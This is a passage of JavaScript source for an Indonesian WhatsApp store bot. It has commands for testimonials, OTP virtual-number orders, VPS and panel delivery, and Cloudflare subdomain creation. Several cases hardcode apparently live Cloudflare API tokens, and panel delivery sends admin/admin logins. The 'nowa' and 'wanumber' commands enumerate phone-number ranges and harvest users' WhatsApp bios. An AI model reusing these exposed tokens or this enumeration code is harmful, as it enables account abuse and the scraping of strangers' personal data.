Biiofc.sendMessage(from, { image: fs.readFileSync(`./testimoni/testimoni_3.jpg`),
 caption: tekssss, 
footer: `${ownerStore} © 2023`},
{quoted: fkontak})
}
break
case 'testi4':{
let tekssss = `𝗛𝗮𝗹𝗹𝗼 𝗸𝗮𝗸👋🏻
Gambar di atas adalah testimoni Dari *${namaStore}*

Untuk Nominal transaksi bisa cek di atas ya kak..

Yang pasti *${namaStore}* adalah store paling amanah dan terpercaya✨

(Testimoni ke 4)
`
Biiofc.sendMessage(from, { image: fs.readFileSync(`./testimoni/testimoni_4.jpg`),
 caption: tekssss, 
footer: `${ownerStore} © 2023`},
{quoted: fkontak})
}
break
case 'testi5':{
let tekssss = `𝗛𝗮𝗹𝗹𝗼 𝗸𝗮𝗸👋🏻
Gambar di atas adalah testimoni Dari *${namaStore}*

Untuk Nominal transaksi bisa cek di atas ya kak..

Yang pasti *${namaStore}* adalah store paling amanah dan terpercaya✨

(Testimoni ke 5)
`
Biiofc.sendMessage(from, { image: fs.readFileSync(`./testimoni/testimoni_5.jpg`),
 caption: tekssss, 
footer: `${ownerStore} © 2023`},
{quoted: fkontak})
}
break
case 'testi6':{
let tekssss = `𝗛𝗮𝗹𝗹𝗼 𝗸𝗮𝗸👋🏻
Gambar di atas adalah testimoni Dari *${namaStore}*

Untuk Nominal transaksi bisa cek di atas ya kak..

Yang pasti *${namaStore}* adalah store paling amanah dan terpercaya✨

(Testimoni ke 6)
`
Biiofc.sendMessage(from, { image: fs.readFileSync(`./testimoni/testimoni_6.jpg`),
 caption: tekssss, 
footer: `${ownerStore} © 2023`},
{quoted: fkontak})
}
break
case 'block':{
if (!isOwner) return reply(`Ngapain ? Khusus RIDZ STORE Aja !!`)
if (!q) return reply(`Ex : ${prefix+command} Nomor Yang Ingin Di Block\n\nContoh :\n${prefix+command} 628xxxx`)
let nomorNya = q
await Biiofc.updateBlockStatus(`${nomorNya}@s.whatsapp.net`, "block") // Block user
reply('Sukses Block Yatim Jebeh Tuan✅')
}
break
case 'unblock':{
if (!isOwner) return reply(`Ngapain ? Khusus RIDZ STORE Aja !!`)
if (!q) return reply(`Ex : ${prefix+command} Nomor Yang Ingin Di Unblock\n\nContoh :\n${prefix+command} 628xxxx`)
let nomorNya = q
await Biiofc.updateBlockStatus(`${nomorNya}@s.whatsapp.net`, "unblock")
reply('Sukses Unblock Yatim Jebeh Krna Terpaksa Tuan✅')
}
break
case 'profile':{
if (!isOwner) return reply(`Ngapain ? Khusus RIDZ STORE Aja !!`)
let kode = await fetchJson(`${global.domainotp}/get-profile/${apikeyotp}`)
if (kode.succes == false) return reply(kode.data.messages)
let res = kode.data.data
let teks =`*GET PROFILE*
- Username: ${res.username}
- Saldo: Rp${toRupiah(cekSaldo(sender, db_saldo))}
- Email: ${res.email}`
reply(teks)
}
break
case 'layanan':{
if (!isOwner) return reply(`Ngapain ? Khusus RIDZ STORE Aja !!`)
let kode = await fetchJson(`${global.domainotp}/get-services/${apikeyotp}`)
if (kode.succes == false) return reply2(kode.data.messages)
var teks = '*Cara Order Nokos, Silahkan Ketik:*\n.order id_layanan\n\n*Contoh:* .order 14\n\n*List Layanan Kode Otp*\n\n'
let GG = 0
for (let x of kode.data.data){
teks +=`- ID layanan: ${x.id}\n- Name: ${x.name}\n- Harga: Rp${toRupiah(x.price)}\n\n`
}
reply(teks)
}
break
case "order":{
if (!isOwner) return reply(`Ngapain ? Khusus RIDZ STORE Aja !!`)
if (!q) return reply(teks_format)
var res = await fetchJson(`${global.domainotp}/set-orders/${apikeyotp}/${q}`)
if (res.success == false) return reply(res.data.messages)
reply(res.data.message)
await sleep(1000)
let ress = res.data.data
reply(`*Berikut Detail Orderan Anda*

- order_id: ${ress.order_id}
- aplikasi_id: ${ress.aplikasi_id}
- number: ${ress.number}
- status: ${ress.status}
- sms: ${ress.sms}
- status_sms: ${ress.status_sms}
- price: Rp${ress.price}
- last_saldo: Rp${toRupiah(ress.last_saldo)}
- created_at: ${ress.created_at}
- last_sms: ${ress.last_sms}
- aplikasi_name: ${ress.aplikasi_name}

• info selengkapnya
silahkan ketik .getorder`)
}
break
case "getorder":{
if (!isOwner) return reply(`Ngapain ? Khusus RIDZ STORE Aja !!`)
if (!q) return reply(teks_format2)
var res = await fetchJson(`${global.domainotp}/set-orders/${apikeyotp}/${q}`)
if (res.success == false) return reply(res.data.messages)
reply(res.data.message)
await sleep(1000)
let ress = res.data.data
reply(`*Berikut Detail Orderan Anda*

- order_id: ${ress.order_id}
- aplikasi_id: ${ress.aplikasi_id}
- number: ${ress.number}
- status: ${ress.status}
- sms: ${ress.sms}
- status_sms: ${ress.status_sms}
- price: Rp${ress.price}
- last_saldo: Rp${toRupiah(ress.last_saldo)}
- created_at: ${ress.created_at}
- last_sms: ${ress.last_sms}
- aplikasi_name: ${ress.aplikasi_name}`)
}
break
case 'svps': case 'sendvps': {
		 if (!isOwner) return reply(`Ngapain ? Khusus RIDZ STORE Aja !!`)
          if (!text) return m.reply(`Example : ${prefix + command} 6285xxxxx,ip,ram,harga,passwordvps`)
            m.reply('Pesanan Telah Sukses Dikirim') 
            var mon = args.join(' ')
            var m1 = mon.split(",")[0]
            var m2 = mon.split(",")[1]
            var m3 = mon.split(",")[2]
            var m4 = mon.split(",")[3]
            var m5 = mon.split(",")[4]
                    let mq1 = m1 + '@s.whatsapp.net'
                  let ownernya = owner + '@s.whatsapp.net'
               let me = m.sender
               let ments = [mq1, ownernya, me]
Biiofc.sendMessage(mq1, {text:`*───❖》RIDZ STORE《❖───*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*📦 Pesananmu Datang 📦*\n*Harga : ${m4}*\n*Hari : ${hariini}*\n*Tanggal : ${tanggal}*\n*Jam : ${jam}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*[+] Ip : ${m2}*\n*[+] Username : root*\n*[+] Password : ${m5}*\n*[+] Ram : ${m3}*\n\n*───《TOS VPS》───*\n\n*-JANGAN SAMPAI TERKENA DDOS*\n*-JANGAN GUNAKAN UNTUK DDOS*\n*-JANGAN GUNAKAN UNTUK MINING*\n*-CPU JANGAN SAMPAI 100%*\n*-MELANGGAR RULES? GARANSI ANGUS*\n*-PANEL SUS NO REFF*\n\n\n\n*© RIDZ STORE*`}, m) 
                 }
            break
 case 'sdomain': case 'sendomain': {
		 if (!isOwner) return reply(`Ngapain ? Khusus RIDZ STORE Aja !!`)
          if (!text) return m.reply(`Example : ${prefix + command} 6285xxxxx,harga,domain`)
            m.reply('Pesanan Telah Sukses Dikirim') 
            var mon = args.join(' ')
            var m1 = mon.split(",")[0]
            var m2 = mon.split(",")[1]
            var m3 = mon.split(",")[2]
                    let mq1 = m1 + '@s.whatsapp.net'
                  let ownernya = owner + '@s.whatsapp.net'
               let me = m.sender
               let ments = [mq1, ownernya, me]
Biiofc.sendMessage(mq1, {text:`*───❖》RIDZ STORE《❖───*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*📦 Pesananmu Datang 📦*\n*Harga : ${m2}*\n*Hari : ${hariini}*\n*Tanggal : ${tanggal}*\n*Jam : ${jam}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*[+] Domain : ${m3}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*_Note : Tutup ( Sensor ) Domain Anda Dan Jangan Sampai Orang Lain Melihat Atau Tidak Nanti Domain Anda Bakal Kena Ddos Attack_*\n\n\n\n*© RIDZ STORE*`}, m) 
                 }
            break
 case 'spanel': case 'sendpanel': {
		 if (!isOwner) return reply(`Ngapain ? Khusus RIDZ STORE Aja !!`)
          if (!text) return m.reply(`Example : ${prefix + command} 6285xxxxx,harga,linklog`)
            m.reply('Pesanan Telah Sukses Dikirim') 
            var mon = args.join(' ')
            var m1 = mon.split(",")[0]
            var m2 = mon.split(",")[1]
            var m3 = mon.split(",")[2]
                    let mq1 = m1 + '@s.whatsapp.net'
                  let ownernya = owner + '@s.whatsapp.net'
               let me = m.sender
               let ments = [mq1, ownernya, me]
Biiofc.sendMessage(mq1, {text:`*───❖》RIDZ STORE《❖───*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*📦 Pesananmu Datang 📦*\n*Harga : ${m2}*\n*Hari : ${hariini}*\n*Tanggal : ${tanggal}*\n*Jam : ${jam}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*[+] Username : admin*\n*[+] Password : admin*\n*[+] Login : ${m3}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*_Note : Jangan Lupa Ganti Password Agar Terhindar Dari Pencurian Akun Panel_*\n\n\n\n*© RIDZ STORE*`}, m) 
                 }
            break
        case 'nowa': {
if (!isOwner) return reply(`Khusus RIDZ STORE Aja`)
if (!args[0]) return m.reply(`Kirim perintah ${prefix+command} <nomer>`)
var noteks = args[0]
if (!noteks.includes('x')) return m.reply('Salah Tuan Bukan Begitu Xixi')
m.reply('Wait Tuan Sedang Kami Proses⏳')
function countInstances(string, word) {
return string.split(word).length - 1;
}
var nomer0 = noteks.split('x')[0]
var nomer1 = noteks.split('x')[countInstances(noteks, 'x')] ? noteks.split('x')[countInstances(noteks, 'x')] : ''
var random_length = countInstances(noteks, 'x')
var random;
if (random_length == 1) {
random = 10
} else if (random_length == 2) {
random = 100
} else if (random_length == 3) {
random = 1000
}
var nomerny = `LIST NOMER WHATSAPP\n\nPunya Bio/status/info\n`
var no_bio = `\nTanpa Bio/status/info || \nHey there! I am using WhatsApp.\n`
var no_watsap = `\nTidak Terdaftar\n`
for (let i = 0; i < random; i++) {
var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
var dom1 = nu[Math.floor(Math.random() * nu.length)]
var dom2 = nu[Math.floor(Math.random() * nu.length)]
var dom3 = nu[Math.floor(Math.random() * nu.length)]
var dom4 = nu[Math.floor(Math.random() * nu.length)]
var rndm;
if (random_length == 1) {
rndm = `${dom1}`
} else if (random_length == 2) {
rndm = `${dom1}${dom2}`
} else if (random_length == 3) {
rndm = `${dom1}${dom2}${dom3}`
} else if (random_length == 4) {
rndm = `${dom1}${dom2}${dom3}${dom4}`
}
var anu = await Biiofc.onWhatsApp(`${nomer0}${i}${nomer1}@s.whatsapp.net`);
var anuu = anu.length !== 0 ? anu : false
try {
try {
var anu1 = await Biiofc.fetchStatus(anu[0].jid)
} catch {
var anu1 = '401'
}
if (anu1 == '401' || anu1.status.length == 0) {
no_bio += `wa.me/${anu[0].jid.split("@")[0]}\n`
} else {
nomerny += `wa.me/${anu[0].jid.split("@")[0]}\nBiography : ${anu1.status}\nDate : ${moment(anu1.setAt).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}\n\n`
}
} catch {
no_watsap += `${nomer0}${i}${nomer1}\n`
}
}
m.reply(`${nomerny}${no_bio}${no_watsap}`)
}
break
case 'wanumber': case 'neednokos': case 'nokoswa':{
if (!isOwner) return reply(`Khusus RIDZ STORE Aja`)
if (!text) return reply(`Provide Number with last number x\n\nExample: ${prefix + command} 62895354709030`)
var inputnumber = text.split(" ")[0]
        
        reply(`Searching for WhatsApp account in given range...`)
        function countInstances(string, word) {
            return string.split(word).length - 1
        }
        var number0 = inputnumber.split('x')[0]
        var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
        var random_length = countInstances(inputnumber, 'x')
        var randomxx
        if (random_length == 1) {
            randomxx = 10
        } else if (random_length == 2) {
            randomxx = 100
        } else if (random_length == 3) {
            randomxx = 1000
        }
        var text66 = `*==[ List of Whatsapp Numbers ]==*\n\n`
        var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`
        var nowhatsapp = `\n*Numbers with no WhatsApp account within provided range.*\n`
        for (let i = 0; i < randomxx; i++) {
            var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
            var status1 = nu[Math.floor(Math.random() * nu.length)]
            var status2 = nu[Math.floor(Math.random() * nu.length)]
            var status3 = nu[Math.floor(Math.random() * nu.length)]
            var dom4 = nu[Math.floor(Math.random() * nu.length)]
            var random21
            if (random_length == 1) {
                random21 = `${status1}`
            } else if (random_length == 2) {
                random21 = `${status1}${status2}`
            } else if (random_length == 3) {
                random21 = `${status1}${status2}${status3}`
            } else if (random_length == 4) {
                random21 = `${status1}${status2}${status3}${dom4}`
            }
            var anu = await Biiofc.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
            var anuu = anu.length !== 0 ? anu : false
            try {
                try {
                    var anu1 = await Biiofc.fetchStatus(anu[0].jid)
                } catch {
                    var anu1 = '401'
                }
                if (anu1 == '401' || anu1.status.length == 0) {
                    nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
                } else {
                    text66 += `🪀 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(anu1.setAt).tz('Asia/Kolkata').format('HH:mm:ss DD/MM/YYYY')}\n\n`
                }
            } catch {
                nowhatsapp += `${number0}${i}${number1}\n`
            }
        }
        reply(`${text66}${nobio}${nowhatsapp}`)
        }
break
   case 'leave': {
if (!isOwner) return reply(`Khusus RIDZ STORE Aja`)
                await Biiofc.groupLeave(m.chat)
                await reply(`Done Tuan✅`)
            }
            break
case 'setbotname':{
if (!isOwner) return reply(`Khusus RIDZ STORE Aja`)
if (!text) return reply(`Dimana Namanya Tuan?\nExample: ${prefix + command} RIDZ STORE`)
    await Biiofc.updateProfileName(text)
    reply(`Berhasil Mengubah Nama Bot Tuan✅`)
    }
    break
case 'setbotbio':{
if (!isOwner) return reply(`Khusus RIDZ STORE Aja`)
if (!text) return reply(`Dimana Textnya Tuan?\nExample: ${prefix + command} RIDZ STORE`)
    await Biiofc.updateProfileStatus(text)
    reply(`Berhasil Mengubah Bio Nomor Bot Tuan✅`)
    }
    break
case "public": {
if (!isOwner) return reply(`Khusus RIDZ STORE Aja`)
Biiofc.public = true
reply(`*SUKSES MODE PUBLIC TUAN✅*`)
}
break
case "self": {
if (!isOwner) return reply(`Khusus RIDZ STORE Aja`)
Biiofc.public = false
reply(`*SUKSES MODE SELF TUAN✅*`)
}
break
case 'domain1': {
 
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "39b4ead5856fa13269c4477f949c7903";
               let apitoken = "kYaXkcrsXu4rWvHGxRK4jcJMD-nUUo70wVtC0TTY";
               let tld = "jasapanelzku.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`✅berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain2': {
           
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "f70a6a6a0f9df1c948c2b0b23df83bb7";
               let apitoken = "mI2YRcPH4dtw9MLa96yagpfxxVYnF3n6qDBaxN5W";
               let tld = "garudanetwork.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain3 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`✅berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain3': {
           
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "016ec3d7a8a5f0c3d2c56ee1980f3f2a";
               let apitoken = "wUVsrl5fpwv6StugCDbxtbzDVz_C5Wpl3qYWIaF7";
               let tld = "cpanell-net.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain5 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`✅berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain4': {
           
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "20fa5bf6edca2ab185be760c15ada53e";
               let apitoken = "nMhPDOJD81O9kEANuKd_qLd22BNX7MX_xcbX7eix";
               let tld = "paneldigital.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain5 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`✅berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
break

 case 'domain5': {
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "0247b9c6ea98cd5c090c4a4d772dd0da";
               let apitoken = "DyQW84WhtZwTfWZCanO-EM8etZFXuoNIJf4cLzDep_mVtjlSQMtdIz6v800w";
               let tld = "mcstorez.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ crate by = ${author}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain6': {
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "03f64b13a833ac197c3c39bd6ae68f8f";
               let apitoken = "Mu_wdV0JMS_4SR0EgZcliavxhcXRDsYJH2Tw67lu";
               let tld = "mymarket2.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ crate by = ${author}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
case 'domain7': {
 
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6282196776245")
function subDomain1(host, ip) {
  return new Promise((resolve) => {
    let zone = "3e6ec90ce998dcbc24a78fcfc6ea4c07";
    let apitoken = "v_h1mTKaf96STmRrCSIoRcvEIXnQMsFhI0jM6ggK";
    let tld = "panelelite.biz.id";
    axios
      .post(
        `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
        { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
        {
          headers: {
 Authorization: "Bearer " + apitoken,
 "Content-Type": "application/json",
          },
        }
      )
      .then((e) => {
        let res = e.data;
        if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Raff Offcial*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain8': {
           
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6282196776245")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "d9281215972a01820c823bcaf63253f0";
               let apitoken = "qgxGwm9y8KDj9iIAF_OnmptrHsGHmwO5EFWXUB1P";
               let tld = "panelhost.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("PENGGUNAAN .domain3 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Raff Offcial_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain9': {
           
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6282196776245")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "217d5caa4dd9adab25e69bdfacd6294b";
               let apitoken = "VXhUGYfiE3Z20gOPXbodcq0_cZHIaeodzfNEyh0B";
